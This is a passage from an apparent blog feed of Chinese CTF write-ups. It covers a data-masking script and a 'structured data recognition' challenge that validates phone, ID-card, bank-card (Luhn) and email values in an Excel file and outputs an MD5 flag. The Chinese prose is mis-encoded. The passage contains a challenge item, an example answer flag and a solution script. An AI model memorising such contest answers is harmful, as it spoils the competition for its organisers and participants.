class="hljs-string">&quot;**********&quot;</span><br>    <span class="hljs-keyword">return</span> bank_card  <span class="hljs-comment"># å¦‚æœé“¶è¡Œå¡å·ä¸ç¬¦åˆè¦æ±‚ï¼Œè¿”å›åŸå§‹å€¼</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">desensitize_email</span>(<span class="hljs-params">email</span>):<br>    <span class="hljs-string">&quot;&quot;&quot;Emailè„±æ•è§„åˆ™ï¼š@å‰éƒ¨åˆ†é™¤ . å¤–çš„å­—ç¬¦ä½¿ç”¨ * æ›¿æ¢&quot;&quot;&quot;</span><br>    local, domain = email.split(<span class="hljs-string">&#x27;@&#x27;</span>)<br>    local = re.sub(<span class="hljs-string">r&#x27;[^\.\*]&#x27;</span>, <span class="hljs-string">&#x27;*&#x27;</span>, local)<br>    <span class="hljs-keyword">return</span> local + <span class="hljs-string">&#x27;@&#x27;</span> + domain<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">desensitize_gender</span>(<span class="hljs-params">gender</span>):<br>    <span class="hljs-string">&quot;&quot;&quot;æ€§åˆ«è„±æ•è§„åˆ™ï¼šæ›¿æ¢ä¸º &#x27;æœªçŸ¥&#x27;&quot;&quot;&quot;</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;æœªçŸ¥&quot;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">desensitize_wechat</span>(<span class="hljs-params">wechat</span>):<br>    <span class="hljs-string">&quot;&quot;&quot;å¾®ä¿¡å·è„±æ•è§„åˆ™ï¼šå°†æ‰€æœ‰å­—ç¬¦æ›¿æ¢ä¸º &#x27;*&#x27;&quot;&quot;&quot;</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(wechat, <span class="hljs-built_in">str</span>):<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;*&#x27;</span> * <span class="hljs-built_in">len</span>(wechat)  <span class="hljs-comment"># æ›¿æ¢æ‰€æœ‰å­—ç¬¦ä¸º *</span><br>    <span class="hljs-keyword">return</span> wechat  <span class="hljs-comment"># å¦‚æœä¸æ˜¯å­—ç¬¦ä¸²ï¼Œç›´æ¥è¿”å›åŸå€¼</span><br><br><span class="hljs-comment"># è¯»å– Excel æ–‡ä»¶</span><br>df = pd.read_excel(<span class="hljs-string">&quot;data.xlsx&quot;</span>, dtype=<span class="hljs-built_in">str</span>)<br><br><span class="hljs-comment"># è„±æ•å¤„ç†æ•°æ®</span><br><span class="hljs-keyword">for</span> column <span class="hljs-keyword">in</span> df.columns:<br>    <span class="hljs-keyword">for</span> i, value <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(df[column]):<br>        <span class="hljs-keyword">if</span> column == <span class="hljs-string">&quot;ç¼–å·&quot;</span>:<br>            <span class="hljs-comment"># ä¿æŒç¼–å·ä¸å˜</span><br>            <span class="hljs-keyword">continue</span><br>        <span class="hljs-keyword">elif</span> column == <span class="hljs-string">&quot;å§“å&quot;</span> <span class="hljs-keyword">and</span> <span class="hljs-built_in">isinstance</span>(value, <span class="hljs-built_in">str</span>):<br>            df.at[i, column] = desensitize_name(value)<br>        <span class="hljs-keyword">elif</span> column == <span class="hljs-string">&quot;æ‰‹æœºå·&quot;</span> <span class="hljs-keyword">and</span> <span class="hljs-built_in">isinstance</span>(value, <span class="hljs-built_in">str</span>):<br>            df.at[i, column] = desensitize_phone(value)<br>        <span class="hljs-keyword">elif</span> column == <span class="hljs-string">&quot;èº«ä»½è¯å·&quot;</span> <span class="hljs-keyword">and</span> <span class="hljs-built_in">isinstance</span>(value, <span class="hljs-built_in">str</span>):<br>            df.at[i, column] = desensitize_id(value)<br>        <span class="hljs-keyword">elif</span> column == <span class="hljs-string">&quot;é“¶è¡Œå¡å·&quot;</span> <span class="hljs-keyword">and</span> <span class="hljs-built_in">isinstance</span>(value, <span class="hljs-built_in">str</span>):<br>            df.at[i, column] = desensitize_bank_card(value)<br>        <span class="hljs-keyword">elif</span> column == <span class="hljs-string">&quot;Email&quot;</span> <span class="hljs-keyword">and</span> <span class="hljs-built_in">isinstance</span>(value, <span class="hljs-built_in">str</span>):<br>            df.at[i, column] = desensitize_email(value)<br>        <span class="hljs-keyword">elif</span> column == <span class="hljs-string">&quot;æ€§åˆ«&quot;</span> <span class="hljs-keyword">and</span> <span class="hljs-built_in">isinstance</span>(value, <span class="hljs-built_in">str</span>):<br>            df.at[i, column] = desensitize_gender(value)<br>        <span class="hljs-keyword">elif</span> column == <span class="hljs-string">&quot;å¾®ä¿¡å·&quot;</span> <span class="hljs-keyword">and</span> <span class="hljs-built_in">isinstance</span>(value, <span class="hljs-built_in">str</span>):<br>            df.at[i, column] = desensitize_wechat(value)<br><br><span class="hljs-comment"># ä¿å­˜è„±æ•åçš„æ•°æ®åˆ°æ–° Excel æ–‡ä»¶</span><br>df.to_excel(<span class="hljs-string">&quot;desensitized_data.xlsx&quot;</span>, index=<span class="hljs-literal">False</span>)<br><br><span class="hljs-comment"># ç”Ÿæˆæ‹¼æ¥å­—ç¬¦ä¸²ï¼ˆæŒ‰è¡Œæ‹¼æ¥ï¼Œæ¯åˆ—æ•°æ®ä¹‹é—´ç”¨é€—å·éš”å¼€ï¼‰</span><br>data_str = <span class="hljs-string">&#x27;&#x27;</span>.join(df.astype(<span class="hljs-built_in">str</span>).values.flatten())<br><br><span class="hljs-comment"># å»é™¤æ‰€æœ‰å¯èƒ½çš„æ¢è¡Œç¬¦å’Œå›è½¦ç¬¦</span><br>data_str = data_str.replace(<span class="hljs-string">&#x27;\n&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>).replace(<span class="hljs-string">&#x27;\r&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>)<br><br><span class="hljs-comment"># è®¡ç®— MD5</span><br>md5_hash = hashlib.md5(data_str.encode()).hexdigest()<br><br><span class="hljs-comment"># è¾“å‡º MD5 ç»“æœ</span><br><span class="hljs-built_in">print</span>(data_str)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;MD5:&quot;</span>, md5_hash)<br></code></pre></td></tr></table></figure><h2 id="ç»“æ„åŒ–æ•°æ®è¯†åˆ«-3"><a href="#ç»“æ„åŒ–æ•°æ®è¯†åˆ«-3" class="headerlink" title="ç»“æ„åŒ–æ•°æ®è¯†åˆ«-3"></a>ç»“æ„åŒ–æ•°æ®è¯†åˆ«-3</h2><p>### é¢˜ç›®æè¿°ï¼š è¯·å‚èµ›é€‰æ‰‹å¯¹ç»™å®šçš„ç»“æ„åŒ–æ–‡ä»¶ã€Šdata.xlsxã€‹è¿›è¡Œå¤„ç†ï¼Œæ–‡ä»¶ä¸­åŒ…æ‹¬æ‰‹æœºå·ã€èº«ä»½è¯å·ç ã€é“¶è¡Œå¡å·ã€é‚®ç®±ç­‰å››ç±»æ•æ„Ÿæ•°æ®ä»¥åŠå¹²æ‰°çš„è„æ•°æ®ï¼ˆæ•°æ®ä¸æ»¡è¶³ç‰¹å¾ï¼‰ã€‚å…·ä½“æ•°æ®æ£€æµ‹è§„åˆ™å¯å‚è€ƒä¸‹æ–‡ã€‚å‚èµ›é€‰æ‰‹éœ€è¦å¯¹æ•°æ®è¿›è¡Œæ¸…æ´—ï¼Œç¼–å†™è§„åˆ™ï¼Œè¯†åˆ«å…¶ä¸­æ­£ç¡®çš„æ•æ„Ÿæ•°æ®ï¼Œå¹¶è¾“å‡ºè¯†åˆ«ç»“æœã€‚ä»…å½“ä¸€è¡Œä¸­æ‰€æœ‰çš„æ•°æ®å‘½ä¸­æ•°æ®ç±»å‹çš„è§„åˆ™æ—¶ï¼Œæ‰è®¤ä¸ºè¯¥è¡Œå‘½ä¸­æŸä¸€æ•°æ®ç±»å‹ã€‚ è¯·å‚èµ›é€‰æ‰‹ç¼–å†™ç¨‹åºå¯¹æ•°æ®è¿›è¡Œè¯†åˆ«ï¼Œè®¡ç®—å…¨éƒ¨éƒ½å‘½ä¸­çš„è¡Œæ•°ï¼Œè®¡ç®—ç­”æ¡ˆçš„ MD5 å€¼ï¼ˆMD5 å€¼è‹±æ–‡å­—ç¬¦å…¨å°å†™ï¼Œé•¿åº¦ 32 ä¸ªå­—ç¬¦ï¼›è®¡ç®—ç­”æ¡ˆçš„ MD5 å€¼æ—¶ï¼Œç”¨ UTF-8 å­—ç¬¦ç¼–ç ï¼‰ï¼Œå¹¶å°†ç­”æ¡ˆçš„ MD5 å€¼æäº¤è‡³å¹³å°ã€‚ 1. <strong>æ‰‹æœºå·</strong>æ˜¯æŒ‡11 ä½çº¯æ•°å­—çš„æ°‘ç”¨æ‰‹æœºå·ï¼Œ å…·ä½“è§„åˆ™ä¸ºï¼ša) 1-3 ä½â€”â€” 138â€”â€”è¿è¥å•†ç½‘ç»œè¯†åˆ«å·ï¼Œè¿è¥å•†åŒ…æ‹¬ä¸­å›½ç§»åŠ¨ã€ä¸­å›½è”é€šã€ä¸­å›½ç”µä¿¡ã€ä¸­å›½å¹¿ç”µb) 4-7 ä½â€”â€”8888â€”â€”åœ°åŒºç¼–ç æˆ–å…¶ä»–ï¼ˆæ— è§„å¾‹ï¼‰c) 8-11 ä½â€”â€”8888â€”â€”ç”¨æˆ·ç¼–ç  2. <strong>èº«ä»½è¯å·ç </strong>æ˜¯æŒ‡18 ä½äºŒä»£èº«ä»½è¯å·ç ï¼Œ å…·ä½“è§„åˆ™ä¸ºï¼ša) 1-6 ä½â€”â€” 140521â€”â€”ä¸ºè¡Œæ”¿åŒºä»£ç ï¼ˆä¸å®šå¹´ä»½æœ‰ä¿®è®¢ï¼‰b) 7-14 ä½â€”â€” 19701231â€”â€”ä¸ºå‡ºç”Ÿå¹´æœˆæ—¥ï¼Œå‡ºç”Ÿå¹´æœˆæ—¥ä¸æ—©äº 1930 å¹´1 æœˆ 1 æ—¥ï¼Œ ä¸æ™šäºå½“å‰æ—¥æœŸc) 15-17 ä½â€”â€”543â€”â€”é¡ºåºç ï¼Œä»»æ„ 3 ä½æ•°å­—ï¼Œç¬¬ 17 ä½å¥‡æ•°ä¸ºç”·æ€§ï¼Œå¶æ•°ä½å¥³æ€§d) 18 ä½â€”â€”2â€”â€”æ ¡éªŒä½ï¼Œå–å€¼èŒƒå›´ä¸º 0~9 æˆ– Xã€‚èº«ä»½è¯å·æ ¡éªŒç®—æ³•å‚ç…§å›½æ ‡GB11643-1999ã€Šå…¬æ°‘èº«ä»½å·ç ã€‹ã€‚ 3. <strong>é“¶è¡Œå¡å·</strong>æ˜¯æŒ‡19 ä½çº¯æ•°å­—çš„é“¶è¡Œå¡å·ï¼Œ å…·ä½“è§„åˆ™ä¸ºï¼šé“¶è¡Œå¡å·è§„åˆ™æ˜¯é“¶è¡Œå¡å·ç”±å‘å¡é“¶è¡Œæ ‡è¯†ã€è´¦æˆ·æ ‡è¯†ã€æ ¡éªŒä½ç­‰éƒ¨åˆ†ç»„æˆã€‚å‘å¡é“¶è¡Œæ ‡è¯†ä¸ºå¼€å¤´çš„6 ä½æ•°å­—ï¼Œä¸åŒçš„é“¶è¡Œæœ‰ä¸åŒçš„BINã€‚é“¶è¡Œå¡å·çš„ä¸­é—´éƒ¨åˆ†ç”¨äºæ ‡è¯†æŒå¡äººçš„è´¦æˆ·ä¿¡æ¯ï¼ŒåŒ…æ‹¬è´¦æˆ·ç±»å‹ã€è´¦æˆ·åˆ†è¡Œç­‰ï¼Œé€šå¸¸åŒ…å«12 ä½æ•°å­—ã€‚é“¶è¡Œå¡å·çš„æœ€åä¸€ä½é€šå¸¸æ˜¯æ ¡éªŒä½ï¼Œç”¨äºæ£€æŸ¥å¡å·æ˜¯å¦åˆæ³•ï¼Œè®¡ç®—æ–¹æ³•æŒ‰ç…§ä¸€å®šçš„ç®—æ³•ç”Ÿæˆã€‚é“¶è¡Œå¡å·æ ¡éªŒä½é‡‡ç”¨Luhn ç®—æ³•ã€‚ 4. <strong>é‚®ç®±</strong>ç”±ç”¨æˆ·å@åŸŸåç»„æˆï¼Œä¸é™åˆ¶é•¿åº¦ï¼Œä¾‹å¦‚ï¼š<a href="mailto:&#x31;&#x32;&#x33;&#x34;&#53;&#54;&#55;&#56;&#57;&#64;&#x31;&#54;&#x33;&#46;&#99;&#x6f;&#x6d;">&#x31;&#x32;&#x33;&#x34;&#53;&#54;&#55;&#56;&#57;&#64;&#x31;&#54;&#x33;&#46;&#99;&#x6f;&#x6d;</a> å…·ä½“è§„åˆ™ä¸ºï¼šç”¨æˆ·å@åŸŸåï¼Œç”¨æˆ·åå¯ç”±å­—æ¯ã€æ•°å­—ã€ä¸‹åˆ’çº¿æ„æˆï¼Œä¸ä»¥ä¸‹åˆ’çº¿å¼€å§‹ï¼›åŸŸåï¼šè‡³å°‘åŒ…å«ä¸€ä¸ªâ€.â€ï¼Œä»¥æœ€åä¸€ä¸ªâ€.â€åˆ†å‰²ä¸ºä¸¤ä¸ªéƒ¨åˆ†ï¼Œå‰åŠéƒ¨åˆ†ç”±å­—æ¯ã€æ•°å­—æˆ–â€.â€æ„æˆï¼Œâ€.â€ä¸èƒ½åœ¨æœ€å‰é¢ï¼›ååŠéƒ¨åˆ†ç”±å­—æ¯æˆ–æ•°å­—æ„æˆã€‚ <strong>æ­£ç¡®ç­”æ¡ˆç¤ºä¾‹</strong>ï¼š2323è¡Œï¼Œmd5åç­”æ¡ˆæäº¤ä¸ºï¼šflag{149815eb972b3c370dee3b89d645ae14}</p><p>æŒºå¥‡æ€ªçš„ä¸€ç‚¹ç‚¹ç­›é€‰ä¸‹æ¥ï¼Œå¦‚æœç›´æ¥åŒ¹é…é“¶è¡Œå¡å·å‰å…­ä½å°±ä»€ä¹ˆéƒ½æ²¡æœ‰ï¼Œå› ä¸ºè¦æ±‚æ¯”è¾ƒç²¾ç¡®ä¸”ä¸€åˆ†é’Ÿå†…æäº¤æœ‰é™åˆ¶ï¼Œæœ€åä¹Ÿæ²¡è¯•å‡ºæ¥</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pandas <span class="hljs-keyword">as</span> pd<br><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">import</span> hashlib<br><br><br><span class="hljs-comment"># æ­£åˆ™è¡¨è¾¾å¼è§„åˆ™</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">is_valid_phone</span>(<span class="hljs-params">phone</span>):<br>    phone_pattern = <span class="hljs-string">r&#x27;^(1(3[4-9]|4[7]|5[0-3]|5[5-9]|6[6]|7[0-3]|8[0-9]|9[1-9]|70[0-9]|9[9]))\d&#123;8&#125;$&#x27;</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">bool</span>(re.<span class="hljs-keyword">match</span>(phone_pattern, phone))<br><br><br><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">from</span> datetime <span class="hljs-keyword">import</span> datetime<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">calculate_check_digit</span>(<span class="hljs-params">id_card</span>):<br>    <span class="hljs-comment"># æƒé‡ç³»æ•°</span><br>    weights = [<span class="hljs-number">7</span>, <span class="hljs-number">9</span>, <span class="hljs-number">10</span>, <span class="hljs-number">5</span>, <span class="hljs-number">8</span>, <span class="hljs-number">4</span>, <span class="hljs-number">2</span>, <span class="hljs-number">1</span>, <span class="hljs-number">6</span>, <span class="hljs-number">3</span>, <span class="hljs-number">7</span>, <span class="hljs-number">9</span>, <span class="hljs-number">10</span>, <span class="hljs-number">5</span>, <span class="hljs-number">8</span>, <span class="hljs-number">4</span>, <span class="hljs-number">2</span>]<br>    <span class="hljs-comment"># æ ¡éªŒä½æ˜ å°„</span><br>    check_map = [<span class="hljs-string">&#x27;1&#x27;</span>, <span class="hljs-string">&#x27;0&#x27;</span>, <span class="hljs-string">&#x27;X&#x27;</span>, <span class="hljs-string">&#x27;9&#x27;</span>, <span class="hljs-string">&#x27;8&#x27;</span>, <span class="hljs-string">&#x27;7&#x27;</span>, <span class="hljs-string">&#x27;6&#x27;</span>, <span class="hljs-string">&#x27;5&#x27;</span>, <span class="hljs-string">&#x27;4&#x27;</span>, <span class="hljs-string">&#x27;3&#x27;</span>, <span class="hljs-string">&#x27;2&#x27;</span>]<br><br>    <span class="hljs-comment"># è®¡ç®—åŠ æƒå’Œ</span><br>    weighted_sum = <span class="hljs-built_in">sum</span>(<span class="hljs-built_in">int</span>(id_card[i]) * weights[i] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">17</span>))<br><br>    <span class="hljs-comment"># å–æ¨¡æ“ä½œ</span><br>    remainder = weighted_sum % <span class="hljs-number">11</span><br><br>    <span class="hljs-comment"># è¿”å›æ ¡éªŒä½</span><br>    <span class="hljs-keyword">return</span> check_map[remainder]<br><br><br><span class="hljs-comment"># èº«ä»½è¯å·æ ¡éªŒ</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">is_valid_id_card</span>(<span class="hljs-params">id_card</span>):<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(id_card) != <span class="hljs-number">18</span> <span class="hljs-keyword">or</span> <span class="hljs-keyword">not</span> id_card[:<span class="hljs-number">17</span>].isdigit():<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br>    <span class="hljs-comment"># ç¬¬ä¸€ä½ä¸èƒ½æ˜¯0æˆ–9</span><br>    <span class="hljs-keyword">if</span> id_card[<span class="hljs-number">0</span>] <span class="hljs-keyword">in</span> &#123;<span class="hljs-string">&#x27;0&#x27;</span>, <span class="hljs-string">&#x27;9&#x27;</span>&#125;:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br>    <span class="hljs-comment"># æ£€æŸ¥çœçº§è¡Œæ”¿åŒºåˆ’ä»£ç æ˜¯å¦åˆæ³•ï¼ˆ11-65ï¼Œ71-82ï¼‰</span><br>    province_code = <span class="hljs-built_in">int</span>(id_card[:<span class="hljs-number">2</span>])<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> (<span class="hljs-number">11</span> &lt;= province_code &lt;= <span class="hljs-number">65</span> <span class="hljs-keyword">or</span> <span class="hljs-number">71</span> &lt;= province_code &lt;= <span class="hljs-number">82</span>):<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br>    <span class="hljs-comment">#ç‰¹æ®Šæ ¡éªŒï¼šç¬¬ä¸€ä½ä¸º7æ—¶ç¬¬äºŒä½åªèƒ½æ˜¯1ï¼›ç¬¬ä¸€ä½ä¸º8æ—¶ç¬¬äºŒä½åªèƒ½æ˜¯1æˆ–2</span><br>    <span class="hljs-keyword">if</span> id_card[<span class="hljs-number">0</span>] == <span class="hljs-string">&#x27;7&#x27;</span> <span class="hljs-keyword">and</span> id_card[<span class="hljs-number">1</span>] != <span class="hljs-string">&#x27;1&#x27;</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>    <span class="hljs-keyword">if</span> id_card[<span class="hljs-number">0</span>] == <span class="hljs-string">&#x27;8&#x27;</span> <span class="hljs-keyword">and</span> id_card[<span class="hljs-number">1</span>] <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> &#123;<span class="hljs-string">&#x27;1&#x27;</span>, <span class="hljs-string">&#x27;2&#x27;</span>&#125;:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br>    <span class="hljs-comment"># åŒºåŸŸç åº”ä¸ºå‰6ä½çš„æ•°å­—</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> re.<span class="hljs-keyword">match</span>(<span class="hljs-string">r&#x27;^\d&#123;6&#125;&#x27;</span>, id_card):<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br>    <span class="hljs-comment"># å‡ºç”Ÿæ—¥æœŸåˆæ³•æ€§æ ¡éªŒ</span><br>    birth_date = id_card[<span class="hljs-number">6</span>:<span class="hljs-number">14</span>]<br>    <span class="hljs-keyword">try</span>:<br>        datetime.strptime(birth_date, <span class="hljs-string">&#x27;%Y%m%d&#x27;</span>)<br>    <span class="hljs-keyword">except</span> ValueError:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br>    <span class="hljs-comment"># é¡ºåºç åº”ä¸ºæ•°å­—</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> id_card[<span class="hljs-number">14</span>:<span class="hljs-number">17</span>].isdigit():<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br>    <span class="hljs-comment"># æ ¡éªŒä½åˆ¤æ–­</span><br>    <span class="hljs-keyword">if</span> id_card[<span class="hljs-number">17</span>].upper() != calculate_check_digit(id_card):<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">is_valid_bank_card</span>(<span class="hljs-params">bank_card</span>):<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(bank_card) != <span class="hljs-number">19</span> <span class="hljs-keyword">or</span> <span class="hljs-keyword">not</span> bank_card.isdigit():<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br>    <span class="hljs-keyword">if</span> bank_card[<span class="hljs-number">0</span>] == <span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> bank_card[<span class="hljs-number">0</span>] == <span class="hljs-string">&#x27;7&#x27;</span> <span class="hljs-keyword">or</span> bank_card[<span class="hljs-number">0</span>] == <span class="hljs-string">&#x27;8&#x27;</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>    <span class="hljs-comment"># Luhn æ ¡éªŒ</span><br>    total = <span class="hljs-number">0</span><br>    reverse_digits = bank_card[::-<span class="hljs-number">1</span>]<br>    <span class="hljs-keyword">for</span> i, digit <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(reverse_digits):<br>        n = <span class="hljs-built_in">int</span>(digit)<br>        <span class="hljs-keyword">if</span> i % <span class="hljs-number">2</span> == <span class="hljs-number">1</span>:<br>            n *= <span class="hljs-number">2</span><br>            <span class="hljs-keyword">if</span> n &gt; <span class="hljs-number">9</span>:<br>                n -= <span class="hljs-number">9</span><br>        total += n<br>    <span class="hljs-keyword">return</span> total % <span class="hljs-number">10</span> == <span class="hljs-number">0</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">is_valid_email</span>(<span class="hljs-params">email</span>):<br>    email_regex = <span class="hljs-string">r&#x27;^[a-zA-Z0-9][a-zA-Z0-9_]*@[a-zA-Z0-9-]+(?:\.[a-zA-Z0-9-]&#123;2,&#125;)+$&#x27;</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">bool</span>(re.<span class="hljs-keyword">match</span>(email_regex, email))<br><br><br><span class="hljs-comment"># è¯»å–Excelæ–‡ä»¶</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">read_and_process_data</span>(<span class="hljs-params">file_path</span>):<br>    df = pd.read_excel(file_path)<br>    valid_count = <span class="hljs-number">0</span><br><br>    <span class="hljs-keyword">for</span> _, row <span class="hljs-keyword">in</span> df.iterrows():<br>        phone_valid = is_valid_phone(row[<span class="hljs-string">&#x27;col2&#x27;</span>])<br>        id_card_valid = is_valid_id_card(row[<span class="hljs-string">&#x27;col1&#x27;</span>])<br>        bank_card_valid = is_valid_bank_card(row[<span class="hljs-string">&#x27;col4&#x27;</span>])<br>        email_valid = is_valid_email(row[<span class="hljs-string">&#x27;col3&#x27;</span>])<br><br>        <span class="hljs-comment"># å¦‚æœä¸€è¡Œçš„æ‰€æœ‰æ•°æ®éƒ½ç¬¦åˆè§„åˆ™</span><br>        <span class="hljs-keyword">if</span> phone_valid <span class="hljs-keyword">and</span> id_card_valid <span class="hljs-keyword">and</span> bank_card_valid <span class="hljs-keyword">and</span> email_valid:<br>            valid_count += <span class="hljs-number">1</span><br>    <span class="hljs-built_in">print</span>(valid_count)<br>    <span class="hljs-keyword">return</span> valid_count<br><br><br><span class="hljs-comment"># è®¡ç®—MD5å€¼</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">calculate_md5</span>(<span class="hljs-params">valid_count</span>):<br>    <span class="hljs-keyword">return</span> hashlib.md5(<span class="hljs-built_in">str</span>(valid_count).encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)).hexdigest()<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">print_valid_data</span>(<span class="hljs-params">file_path</span>):<br>    df = pd.read_excel(file_path)<br>    <span class="hljs-keyword">for</span> _, row <span class="hljs-keyword">in</span> df.iterrows():<br>        phone_valid = is_valid_phone(row[<span class="hljs-string">&#x27;col2&#x27;</span>])<br>        id_card_valid = is_valid_id_card(row[<span class="hljs-string">&#x27;col1&#x27;</span>])<br>        bank_card_valid = is_valid_bank_card(row[<span class="hljs-string">&#x27;col4&#x27;</span>])<br>        email_valid = is_valid_email(row[<span class="hljs-string">&#x27;col3&#x27;</span>])<br><br>        <span class="hljs-keyword">if</span> phone_valid <span class="hljs-keyword">and</span> id_card_valid <span class="hljs-keyword">and</span> bank_card_valid <span class="hljs-keyword">and</span> email_valid:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Valid data: <span class="hljs-subst">&#123;row.to_dict()&#125;</span>&quot;</span>)<br><br><span class="hljs-comment"># ä¸»ç¨‹åº</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    file_path = <span class="hljs-string">&#x27;data.xlsx&#x27;</span>  <span class="hljs-comment"># æ›¿æ¢ä¸ºæ–‡ä»¶è·¯å¾„</span><br>    valid_count = read_and_process_data(file_path)<br>    md5_result = calculate_md5(valid_count)<br>    print_valid_data(file_path)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;MD5 Result: flag&#123;&#123;<span class="hljs-subst">&#123;md5_result&#125;</span>&#125;&#125;&quot;</span>)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    main()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>æ¯”èµ›wp</category>
      
    </categories>
    
    
    <tags>
      
      <tag>rc4é­”æ”¹</tag>
      
      <tag>æ•°è®º</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>defconctf2025_qualifier</title>
    <link href="/2025/04/21/defconctf2025-qualifier/"/>
    <url>/2025/04/21/defconctf2025-qualifier/</url>
    
